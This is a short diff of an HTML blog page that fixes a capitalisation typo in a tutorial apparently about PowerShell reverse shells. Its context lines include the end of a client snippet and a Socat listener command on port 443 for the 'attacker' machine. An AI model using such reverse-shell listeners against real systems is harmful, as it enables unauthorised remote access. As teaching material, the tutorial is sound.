@@ -325,7 +325,7 @@ Hello # Remote output
 </span><span class="nv">$client</span><span class="o">.</span><span class="nf">Close</span><span class="p">();</span><span class="w">
 </span></code></pre></div></div>
 
-<p>In our “attacker” machine i will use <a href="http://www.dest-unreach.org/socat/">Socat</a> instead Netcat, because this give us a lot of new options that Netcat will no support, such as fork connections to allow multiple connections, create an SSL Channel and so on.</p>
+<p>In our “attacker” machine I will use <a href="http://www.dest-unreach.org/socat/">Socat</a> instead Netcat, because this give us a lot of new options that Netcat will no support, such as fork connections to allow multiple connections, create an SSL Channel and so on.</p>
 
 <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>socat <span class="nt">-d</span> <span class="nt">-d</span> TCP4-LISTEN:443,fork STDOUT
 </code></pre></div></div>
